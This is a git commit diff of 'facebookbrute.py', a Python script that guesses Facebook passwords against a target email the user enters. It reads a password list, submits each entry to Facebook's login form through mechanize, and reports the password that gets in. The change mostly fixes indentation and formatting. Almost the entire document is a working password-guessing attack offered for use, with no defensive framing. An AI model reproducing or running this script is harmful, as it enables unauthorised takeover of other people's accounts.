230575b6c16224311dcdb42c65a0bca6c31fb612
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-05 21:39:17 +0545

    Update facebookbrute.py

--- facebookbrute.py
+++ facebookbrute.py
@@ -1,56 +1,55 @@
 import time
 import sys
 
-if sys.version_info[0] !=2: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 2.x
-	use: python fb2.py
+if sys.version_info[0] != 2:
+    print('''--------------------------------------
+    REQUIRED PYTHON 2.x
+    use: python fb2.py
 --------------------------------------
-			''')
-	sys.exit()
+            ''')
+    sys.exit()
 
-post_url='https://www.facebook.com/login.php'
+post_url = 'https://www.facebook.com/login.php'
 headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
 try:
-	import mechanize
-	import urllib2
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
-	print('\n\tPlease install mechanize.\n')
-	sys.exit()
+    import mechanize
+    browser = mechanize.Browser()
+    browser.addheaders = [('User-Agent', headers['User-Agent'])]
+    browser.set_handle_robots(False)
+except ImportError:
+    print('\n\tPlease install mechanize.\n')
+    sys.exit()
 
 print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
-file=open('passwords.txt','r')
+file = open('passwords.txt', 'r')
 
-email=str(raw_input('Enter Email/Username : ').strip())
+email = str(raw_input('Enter Email/Username: ').strip())
 
-print ("\nTarget Email ID : ",email)
-print "\nTrying Passwords from list ..."
+print("\nTarget Email ID:", email)
+print("\nTrying Passwords from the list...")
 
-i=0
+i = 0
 while file:
-	passw=file.readline().strip()
-	i+=1
-	if len(passw) < 6:
-		continue
-	print str(i) +" : ",passw
-	response = browser.open(post_url)
-	try:
-    if response.code == 200:
-        browser.select_form(nr=0)
-        browser.form['email'] = email
-        browser.form['pass'] = passw
-        response = browser.submit()
-        response_data = response.read()
-        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-            decoded_response = response_data.decode('utf-8')
-            print('Your password is:', passw)
-            print('Response Data:', decoded_response)
-            break
-except Exception as e:
-    print('Error:', e)
+    passw = file.readline().strip()
+    i += 1
+    if len(passw) < 6:
+        continue
+    print(str(i) + ": ", passw)
+    response = browser.open(post_url)
+    try:
+        if response.code == 200:
+            browser.select_form(nr=0)
+            browser.form['email'] = email
+            browser.form['pass'] = passw
+            response = browser.submit()
+            response_data = response.read()
+            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+                decoded_response = response_data.decode('utf-8')
+                print('Your password is:', passw)
+                print('Response Data:', decoded_response)
+                break
+    except Exception as e:
+        print('Error:', e)
